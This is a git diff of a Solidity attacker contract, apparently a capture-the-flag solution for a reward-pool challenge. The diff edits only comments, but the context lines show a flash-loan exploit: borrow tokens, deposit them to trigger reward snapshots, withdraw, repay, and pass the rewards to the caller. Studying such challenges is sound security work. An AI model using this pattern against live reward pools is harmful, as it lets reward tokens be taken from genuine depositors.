@@ -11,7 +11,7 @@ contract TheRewarderPoolAttacker {
         rewarder = target; 
         //flashLoanPool and call Flashloan.
         FlashLoanerPool(pool).flashLoan(amount);
-        //Get this contract reward. 
+        //Get this contract reward's from rewarderpool. 
         uint256 contractReward = TheRewarderPool(target).rewardToken().balanceOf(address(this));
         //transfer reward token to caller.
         TheRewarderPool(target).rewardToken().transfer(msg.sender,contractReward);
@@ -20,13 +20,14 @@ contract TheRewarderPoolAttacker {
     }
 
     function receiveFlashLoan(uint256 amount) public {
-        //approve pool liquity token
+        //once token in attacker contract.
+        // approve Rewarderpool liquity token
         TheRewarderPool(rewarder).liquidityToken().approve(rewarder, amount);
-        // use pool to desposit token.
+        // use flashloan to desposit token.
         TheRewarderPool(rewarder).deposit(amount);
         // withdraw amount to token contract.
         TheRewarderPool(rewarder).withdraw(amount);
-        // Use token contract to send to Flashloaner Pool ??
+        // Use token contract to send to send back to Flashloaner Pool.
         TheRewarderPool(rewarder).liquidityToken().transfer(msg.sender, amount);
     }
 }
